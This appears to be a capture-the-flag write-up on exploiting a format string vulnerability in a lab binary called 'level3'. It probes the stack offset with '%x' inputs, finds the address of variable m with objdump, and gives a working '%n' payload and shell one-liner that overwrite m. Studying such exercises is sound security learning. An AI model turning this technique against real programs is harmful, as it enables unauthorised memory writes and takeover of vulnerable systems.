While decompiling the binary we can observe the use of the function `printf` without any protection. We could then exploit this function to write a wanted value in a desired variable. For exemple, we could write `0x40` (64 in decimal) in the variable `m`.

## Investigation

First, we need to know where or input ar located in the stack. For this we can give the binary an input like `AAAA.%x.%x.%x.%x.%x.%x.%x.%x`. Giving this, we got the ouput
```
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78.2e78252e
```
We can then observe that our input string is the 4th argument in the stack.

Second, we need to know where the variable `m` is stored. We can execute `objdump -t ./level3 | grep m`.
```
0804988c g     O .bss   00000004              m
```
We now know that `m` is located at `0x0804988c`.

## Exploit

We can use an exploit like `<target location>%<value - 4>x%<string argument>$n`. In our case that would give us `\x8c\x98\x04\x08%60x%4$n` (location written in little endian).

```shell
(cat <(python -c 'print "\x8c\x98\x04\x08%60x%4$n"') -) | ./level3
```
